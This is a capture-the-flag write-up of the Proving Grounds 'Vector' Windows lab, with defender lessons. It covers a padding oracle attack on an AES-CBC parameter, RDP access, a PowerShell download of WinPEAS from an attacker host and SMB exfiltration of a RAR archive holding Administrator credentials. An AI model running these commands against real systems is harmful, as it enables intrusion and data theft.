# Vector(windows) — Proving Grounds Writeup

**Platform:** Proving Grounds Practice

**OS:** Windows Server 2019

**Difficulty:** Hard

**Job Role:** Senior Penetration Tester / Lead Penetration Tester

**Tags:** Padding Oracle Attack · AES-CBC Decryption · RDP Access · RAR File Analysis · Credential Recovery

---

## Table of Contents

1. [Lab Overview](#lab-overview)
2. [Reconnaissance](#reconnaissance)
3. [Enumeration — Port 2290 Web Application](#enumeration--port-2290-web-application)
4. [Exploitation — Padding Oracle Attack (AES-CBC)](#exploitation--padding-oracle-attack-aes-cbc)
5. [Initial Access — RDP as victor](#initial-access--rdp-as-victor)
6. [Privilege Escalation — RAR File Credential Extraction](#privilege-escalation--rar-file-credential-extraction)
7. [Administrator Access](#administrator-access)
8. [Flags](#flags)
9. [Attack Chain](#-attack-chain)
10. [Skills Demonstrated](#-skills-demonstrated)
11. [Lessons Learned](#-lessons-learned)
12. [References](#references)

---

## Lab Overview

> *"To breach this lab, you will perform a padding oracle attack against a web application using an unauthenticated AES-CBC encryption scheme. This lab focuses on exploiting cryptographic vulnerabilities and password recovery techniques."*

**Key Objectives:**
- Identify a vulnerable AES-CBC-PKCS7 ciphertext exposed in ASP.NET page source
- Exploit the padding oracle vulnerability to recover plaintext credentials
- Gain RDP access as a standard user (`victor`)
- Locate and exfiltrate a password-protected RAR archive
- Decode base64-encoded Administrator credentials for full system compromise

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -sS -A -T5 -p- -Pn 192.168.200.119
```

<img width="1150" height="776" alt="image" src="https://github.com/user-attachments/assets/00f18d50-ad0a-4666-9b2e-54ed9a636282" />

<img width="1618" height="735" alt="image" src="https://github.com/user-attachments/assets/56457a7d-2bfc-4756-9277-09df0a9bc751" />


**Ports Discovered:**

| Port | State | Service | Version / Notes |
|------|-------|---------|-----------------|
| 21 | open | FTP | Microsoft ftpd — `SYST: Windows_NT` |
| 80 | open | HTTP | Microsoft IIS httpd 10.0 — no title |
| 135 | open | msrpc | Microsoft Windows RPC |
| 139 | open | netbios-ssn | Microsoft Windows netbios-ssn |
| 445 | open | microsoft-ds | Windows Server 2008 R2 – 2012 |
| 2290 | open | HTTP | Microsoft IIS httpd 10.0 — **key target** |
| 3389 | open | ms-wbt-server | Microsoft Terminal Services (RDP) |
| 5985 | open | HTTP | Microsoft HTTPAPI 2.0 (SSDP/UPnP) |

**Key Nmap Findings:**
- RDP certificate: `commonName=vector`
- NetBIOS/RDP target name: **VECTOR**
- OS fingerprint: Microsoft Windows Server 2019 (92% confidence)
- SMB signing enabled but **not required** — potential relay attack surface
- HTTP TRACE method enabled on IIS — risky method enabled

---

## Enumeration — Port 2290 Web Application

### Initial Web Application Discovery

Navigating to `http://192.168.200.119:2290` returns an error:

<img width="915" height="174" alt="image" src="https://github.com/user-attachments/assets/ea697ebc-d8b9-41e7-bbd6-4f37f2ca23a4" />


```
ERROR: missing parameter "c"
```

The application requires a `c` parameter. Testing with a random value:

```
http://192.168.200.119:2290/?c=123123
```

<img width="910" height="185" alt="image" src="https://github.com/user-attachments/assets/5dc38dee-77bf-43ae-8991-a0bb511ed37d" />



The application returns `0` — a binary true/false response based on whether the submitted ciphertext is valid.

### Source Code Analysis

Inspecting the page source reveals critical information:

https://pulsesecurity.co.nz/articles/dotnet-padding-oracles

```html
<head></head><body><form method="post" action="./?c=123123" id="MyForm">
<div class="aspNetHidden">
    <input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE"
    value="/wEPDwUJMjI5MTY0MjY4D2QWAmYPZBYCAgEPDxYCHgRUZXh0BQEwZGRk
    IukfepzJl/4svURp/06bcRn15ZK2Pnekpudd6Yu6sNk=">
</div>
<div class="aspNetHidden">
    <input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR"
    value="CA0B0334">
</div>
<span id="MyLabel">0</span>
<!--
    AES-256-CBC-PKCS7 ciphertext: 4358b2f77165b5130e323f067ab6c8a92312420765204ce350b1fbb826c59488

    Victor's TODO: Need to add authentication eventually..
-->
</form></body>
```

> **Critical Findings:**
> - AES-256-CBC-PKCS7 ciphertext hardcoded in source: `4358b2f77165b5130e323f067ab6c8a92312420765204ce350b1fbb826c59488`
> - Developer comment reveals the username: **Victor**
> - The application returns a binary `0`/`1` based on padding validity — a classic **Padding Oracle** condition
> - VIEWSTATE is present, confirming this is an **ASP.NET** application

---

## Exploitation — Padding Oracle Attack (AES-CBC)

### Vulnerability Analysis

**Vulnerability Type:** Padding Oracle Attack (AES-256-CBC-PKCS7)
**Root Cause:** The web application returns a distinguishable error response (`0`) when CBC-PKCS7 padding is invalid, allowing byte-by-byte decryption without the key.

**References:**
- https://pulsesecurity.co.nz/articles/dotnet-padding-oracles
- https://github.com/mpgn/Padding-oracle-attack

### Step 1 — Clone the Padding Oracle Attack Tool

```bash
git clone https://github.com/mpgn/Padding-oracle-attack.git
cd Padding-oracle-attack
```

<img width="1058" height="248" alt="image" src="https://github.com/user-attachments/assets/1631830c-64d4-4dcb-9370-9fbba3c811f1" />


### Step 2 — Add Host Entry

Map the target IP to the hostname used by the exploit:

```bash
echo "192.168.200.119 box.os" | sudo tee -a /etc/hosts
```

<img width="863" height="99" alt="image" src="https://github.com/user-attachments/assets/c7a42d07-e637-48be-8ebf-07547179b9bc" />


```
192.168.200.119 box.os
```

### Step 3 — Execute the Padding Oracle Attack

```bash
python exploit.py \
  -c 4358b2f77165b5130e323f067ab6c8a92312420765204ce350b1fbb826c59488 \
  -l 16 \
  --host box.os:2290 \
  -u /?c= \
  -v \
  --error '<span id="MyLabel">0</span>'
```

**Parameter Breakdown:**

| Flag | Value | Purpose |
|------|-------|---------|
| `-c` | `4358b2f7...` | AES ciphertext from page source |
| `-l` | `16` | Block size (AES-256 = 16 bytes) |
| `--host` | `box.os:2290` | Target host and port |
| `-u` | `/?c=` | URL parameter to inject ciphertext |
| `--error` | `<span id="MyLabel">0</span>` | Error string indicating invalid padding |

<img width="828" height="102" alt="image" src="https://github.com/user-attachments/assets/12be05f3-6e5f-47b7-9f49-d6fb6710a311" />


**Exploit Output:**

```
[+] Decrypted value (HEX): 576F726D416C6F655661743704040404
[+] Decrypted value (ASCII): WormAloeVat7
```

**Decrypted Credentials:**

```
username : victor
password : WormAloeVat7
```

---

## Initial Access — RDP as victor

### Step 4 — Connect via FreeRDP

```bash
xfreerdp /v:box.os:3389 /u:victor /p:WormAloeVat7
```

<img width="1055" height="796" alt="image" src="https://github.com/user-attachments/assets/3d875633-278e-4660-a502-665bb56404f8" />


Successfully connected to the Windows desktop as **victor**. The `local.txt` file is visible directly on the desktop.

---

## Privilege Escalation — RAR File Credential Extraction

### Step 5 — Download WinPEAS for Enumeration

From the RDP session, open PowerShell and download WinPEAS:

```powershell
(new-object System.Net.WebClient).DownloadFile(
    'http://192.168.45.216/winPEASany_ofs.exe',
    '.\\Desktop\\winPEASany_ofs.exe'
)
```

WinPEAS identifies victor's Downloads folder contains an interesting file.

### Step 6 — Discover backup.rar

Navigating to `C:\Users\victor\Downloads`:

```cmd
cd downloads
dir
```

<img width="702" height="308" alt="image" src="https://github.com/user-attachments/assets/b19679ec-9219-4b2a-b635-38f3f6f59447" />


```
Directory of C:\Users\victor\Downloads

12/03/2020  06:47 AM    <DIR>          .
12/03/2020  06:47 AM    <DIR>          ..
07/21/2020  09:59 AM               286 backup.rar
               1 File(s)            286 bytes
```

### Step 7 — Exfiltrate backup.rar via Impacket SMB

Set up an authenticated SMB server on Kali:

```bash
impacket-smbserver share /root/loot -smb2support -username victor -password WormAloeVat7
```

On the target (RDP session):

```cmd
net use \\192.168.45.216\share /user:victor WormAloeVat7
copy backup.rar \\192.168.45.216\share\
```

<img width="768" height="401" alt="image" src="https://github.com/user-attachments/assets/779063b0-c965-4212-9a51-4b3086241f69" />


```
The command completed successfully.
1 file(s) copied.
```

### Step 8 — Extract backup.rar on Kali

The archive is password-protected. Testing victor's password:

```bash
cd ~/loot
unrar e ./backup.rar
# Enter password: WormAloeVat7
```

<img width="1462" height="286" alt="image" src="https://github.com/user-attachments/assets/3e64f450-81e3-42ab-9753-ca59055453c8" />

<img width="948" height="367" alt="image" src="https://github.com/user-attachments/assets/372eb9a0-4ff1-417c-a47c-dd1606ae63a4" />


```
UNRAR 7.23 freeware
Extracting from ./backup.rar
Extracting  backup.txt    OK
All OK
```

### Step 9 — Decode Base64 Credentials

```bash
cat backup.txt
# QWRtaW5pc3RyYXRvcjpFdmVyeXdheVlhYmVsV3JhcDM3NQ==

cat backup.txt | base64 -d
```

<img width="948" height="367" alt="image" src="https://github.com/user-attachments/assets/c8dc87d5-3b5f-4b8d-a148-2e6c6c0d2d24" />


```
Administrator:EverywayLabelWrap375
```

**Administrator Credentials Obtained:**

```
username : Administrator
password : EverywayLabelWrap375
```

---

## Administrator Access

### Step 10 — RDP as Administrator

```bash
xfreerdp /v:box.os:3389 /u:Administrator /p:EverywayLabelWrap375
```

Or connect from the existing RDP session:

```cmd
cd desktop
dir
type proof.txt
```

<img width="664" height="359" alt="image" src="https://github.com/user-attachments/assets/84c104d7-15a0-4713-a73a-bcfec140e0af" />


```
C:\Users\Administrator\Desktop>type proof.txt
91d17e6661075569d38804b00931372b
```

**Full Administrator access confirmed!**

---

## Flags

### local.txt (victor's Desktop)

```
5b874b83bf866a069c748f35efde2784
```

<img width="1043" height="640" alt="image" src="https://github.com/user-attachments/assets/9d9de7dd-ceb9-4f22-b29a-b34e6236f87a" />


### proof.txt (Administrator's Desktop)

```
C:\Users\Administrator\Desktop>type proof.txt
91d17e6661075569d38804b00931372b
```

<img width="664" height="359" alt="image" src="https://github.com/user-attachments/assets/e47aa699-e293-4d09-94b8-9b575c2937bd" />


---

## 🗺️ Attack Chain

```
Target: 192.168.200.119 (VECTOR)
│
├── [Reconnaissance] nmap -sC -sV -sS -A -T5 -p- -Pn
│       ├── Port 21:   FTP  (Microsoft ftpd, Windows_NT)
│       ├── Port 80:   HTTP (IIS 10.0 — blank page)
│       ├── Port 445:  SMB  (signing not required)
│       ├── Port 2290: HTTP (IIS 10.0 — web app with ?c= parameter) ← KEY
│       ├── Port 3389: RDP  (commonName=vector, NTLM domain: VECTOR)
│       └── Port 5985: WinRM (Microsoft HTTPAPI 2.0)
│
├── [Enumeration] Port 2290 Web Application
│       ├── http://192.168.200.119:2290/ → ERROR: missing parameter "c"
│       ├── http://192.168.200.119:2290/?c=123123 → returns 0 (invalid)
│       ├── View Page Source → found HTML comment:
│       │       AES-256-CBC-PKCS7 ciphertext: 4358b2f77165b5130e323f...
│       │       Victor's TODO: Need to add authentication eventually..
│       └── Binary error oracle: 0 = invalid padding, 1 = valid padding
│
├── [Exploit] Padding Oracle Attack (AES-256-CBC-PKCS7)
│       ├── Reference: https://github.com/mpgn/Padding-oracle-attack
│       ├── echo "192.168.200.119 box.os" | sudo tee -a /etc/hosts
│       ├── python exploit.py -c <ciphertext> -l 16 --host box.os:2290
│       │       -u /?c= --error '<span id="MyLabel">0</span>'
│       ├── [+] HEX:   576F726D416C6F655661743704040404
│       └── [+] ASCII: WormAloeVat7
│
├── [Initial Access] RDP as victor
│       ├── xfreerdp /v:box.os:3389 /u:victor /p:WormAloeVat7
│       ├── Windows desktop accessed successfully
│       └── local.txt: 5b874b83bf866a069c748f35efde2784
│
├── [Post-Exploitation] WinPEAS + Manual Enumeration
│       ├── Downloaded winPEASany_ofs.exe via PowerShell WebClient
│       └── Found: C:\Users\victor\Downloads\backup.rar (286 bytes)
│
├── [File Exfiltration] Impacket SMB Server
│       ├── impacket-smbserver share /root/loot -smb2support
│       ├── net use \\192.168.45.216\share /user:victor WormAloeVat7
│       └── copy backup.rar \\192.168.45.216\share\ → 1 file(s) copied
│
├── [Credential Extraction] RAR Archive + Base64 Decode
│       ├── unrar e ./backup.rar → password: WormAloeVat7 (reused!)
│       ├── cat backup.txt → QWRtaW5pc3RyYXRvcjpFdmVyeXdheVlhYmVsV3JhcDM3NQ==
│       └── base64 -d → Administrator:EverywayLabelWrap375
│
└── [Administrator Access] Full System Compromise
        ├── xfreerdp /v:box.os:3389 /u:Administrator /p:EverywayLabelWrap375
        └── proof.txt: 91d17e6661075569d38804b00931372b ✅
```

---

## 🛡️ Skills Demonstrated

| Skill | Application | MITRE ATT&CK |
|-------|-------------|--------------|
| **Network Reconnaissance** | Full nmap scan identifying IIS, RDP, SMB, FTP across all ports | T1046 — Network Service Scanning |
| **Web Application Penetration Testing** | Analyzed ASP.NET app behavior with custom parameter fuzzing | T1190 — Exploit Public-Facing Application |
| **Source Code Analysis** | Inspected HTML source to extract hardcoded AES ciphertext and developer comments | T1083 — File and Directory Discovery |
| **Cryptographic Attack (Padding Oracle)** | Exploited AES-CBC-PKCS7 padding oracle to decrypt ciphertext without key | T1600 — Weaken Encryption |
| **Password Recovery** | Recovered plaintext password via block cipher decryption oracle | T1110 — Brute Force / Credential Recovery |
| **RDP Exploitation** | Used `xfreerdp` for authenticated desktop access as standard user and admin | T1021.001 — Remote Desktop Protocol |
| **Windows Post-Exploitation** | Ran WinPEAS, navigated filesystem, located sensitive files in Downloads | T1057 — Process Discovery |
| **SMB File Exfiltration** | Used Impacket `smbserver` to exfiltrate `backup.rar` from the target | T1039 — Data from Network Shared Drive |
| **Archive Password Cracking** | Cracked password-protected RAR archive using reused credentials | T1552.001 — Credentials in Files |
| **Base64 Credential Decoding** | Decoded base64-encoded `Administrator` credentials from extracted file | T1140 — Deobfuscate/Decode Files |
| **Credential Reuse** | Used victor's password for both RDP and RAR extraction | T1078 — Valid Accounts |
| **Privilege Escalation (Windows)** | Escalated from standard user to Administrator via credential chain | T1068 — Exploitation for Privilege Escalation |
| **Scripting (PowerShell)** | Used PowerShell `System.Net.WebClient` for in-session file download | T1059.001 — PowerShell |

---

## 📚 Lessons Learned

### 🔴 For Attackers (Pentesters)

- **Always read HTML source code carefully.** This lab's entire attack vector was exposed in an HTML comment — the AES ciphertext and the developer's username hint (`Victor's TODO`). Inspect every page source, especially on custom applications.
- **Binary oracle responses are gold.** Any application that returns a distinct response for valid vs. invalid input (padding, credentials, tokens) can potentially be exploited as an oracle. Here, `0` = invalid padding, `1` = valid — all that's needed for a full padding oracle attack.
- **Padding oracle attacks work against AES-CBC without the key.** If you can submit modified ciphertexts and observe the padding error, you can decrypt any block byte-by-byte. Block size (16 for AES) is all you need to know.
- **Password reuse is a critical pivot point.** Victor's password `WormAloeVat7` worked for RDP, and also for the RAR archive password — always try every recovered credential against every service and file.
- **Look for archives and backup files during post-exploitation.** `backup.rar` in a Downloads folder is a classic finding. Always check `Downloads`, `Documents`, `Desktop`, and temp directories for sensitive files.
- **Impacket SMB server is the cleanest Windows file exfiltration method.** Authenticated SMB transfer is fast, reliable, and blends in with normal Windows file operations.
- **Base64 is not encryption.** Developers frequently encode sensitive data in base64 thinking it provides security — always decode any base64-looking strings found in files or logs.
- **`xfreerdp` is your best friend on Windows targets.** Combine with `-drive` flag to mount local Kali directories directly into the RDP session for easy tool transfer.

### 🔵 For Defenders

- **Never expose sensitive cryptographic information in client-side code.** The AES ciphertext and encryption scheme type in an HTML comment is a catastrophic implementation failure. Strip all debug comments before deployment.
- **Implement server-side validation without padding error disclosure.** Return identical responses for all error types — invalid token, invalid padding, invalid format. Any distinguishable error response can be exploited as an oracle.
- **Use authenticated encryption (AES-GCM) instead of AES-CBC.** AES-GCM provides both encryption and integrity verification, making padding oracle attacks structurally impossible. Never use AES-CBC for authentication tokens without a MAC.
- **Enforce strong password policies and prevent reuse.** Victor's password was weak enough to protect a RAR archive containing Administrator credentials — use a password manager and never reuse passwords across services and files.
- **Never store credentials in local files unencrypted.** `backup.txt` containing `Administrator:EverywayLabelWrap375` is a single file exfiltration away from full system compromise. Use a proper secrets manager (HashiCorp Vault, Windows Credential Manager).
- **Restrict RDP access with Network Level Authentication (NLA) and MFA.** RDP exposed directly to the network with only password authentication is high risk. Require VPN + MFA before any RDP access.
- **Enable SMB signing.** The nmap scan flagged SMB signing as disabled — enable it via Group Policy to prevent relay attacks alongside credential theft.
- **Disable HTTP TRACE method on IIS.** Nmap flagged TRACE as enabled — disable it in IIS configuration to reduce XST (Cross-Site Tracing) attack surface.
- **Implement least privilege.** Victor (a standard user) had credentials that unlocked Administrator access via a single RAR file. Segment credentials and restrict access to sensitive backups.
- **Monitor for password-protected archive creation.** Sensitive data stored in encrypted archives in user directories is a common data exfiltration staging technique. Alert on RAR/ZIP creation in user home directories.

### 🟡 Key Vulnerabilities Summary

| Vulnerability | Root Cause | Severity | Impact | Mitigation |
|---------------|-----------|----------|--------|-----------|
| **Padding Oracle (AES-CBC)** | Binary padding error response disclosed to client | Critical | Full ciphertext decryption without key | Use AES-GCM; return uniform error responses |
| **Hardcoded Ciphertext in Source** | AES token exposed in HTML comment | Critical | Enables padding oracle attack | Remove all debug info from production code |
| **Developer Comment Disclosure** | Username leaked in HTML comment | Medium | Username enumeration for RDP | Enforce code review; strip all comments pre-deploy |
| **Credential Reuse** | Same password for RDP and RAR archive | High | Lateral credential reuse | Enforce unique passwords; use password manager |
| **Cleartext Credentials in File** | Admin credentials base64-encoded in backup.txt | Critical | Full administrator compromise | Use secrets manager; never store creds in files |
| **SMB Signing Disabled** | Default Windows SMB configuration | Medium | Potential relay attack surface | Enable SMB signing via Group Policy |
| **Unauthenticated RDP Exposure** | RDP directly accessible on port 3389 | High | Remote authentication attacks | Require VPN + NLA + MFA for RDP access |

---

## References

- [Padding Oracle Attack — Pulse Security](https://pulsesecurity.co.nz/articles/dotnet-padding-oracles)
- [Padding Oracle Attack Tool — mpgn (GitHub)](https://github.com/mpgn/Padding-oracle-attack)
- [MITRE ATT&CK — T1600: Weaken Encryption](https://attack.mitre.org/techniques/T1600/)
- [MITRE ATT&CK — T1021.001: Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001/)
- [MITRE ATT&CK — T1140: Deobfuscate/Decode Files](https://attack.mitre.org/techniques/T1140/)
- [Vector Writeup Reference — Medium](https://medium.com/@thetraphacker/proving-grounds-pg-vector-writeup-c5b09b8ddd29)
- [Impacket SMBServer Documentation](https://github.com/fortra/impacket)

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Network reconnaissance and service fingerprinting |
| Browser DevTools | HTML source code analysis and ciphertext extraction |
| `git clone` | Padding oracle attack tool acquisition |
| `python exploit.py` | AES-CBC padding oracle decryption |
| `xfreerdp` | Remote Desktop Protocol client for Windows access |
| `PowerShell WebClient` | In-session tool download (WinPEAS) |
| `winPEASany_ofs.exe` | Automated Windows privilege escalation enumeration |
| `impacket-smbserver` | Authenticated SMB server for file exfiltration |
| `unrar` | Password-protected RAR archive extraction |
| `base64` | Credential string decoding |

---

**Platform:** OffSec Proving Grounds Practice

**Author:** Tanvir Ahmed 
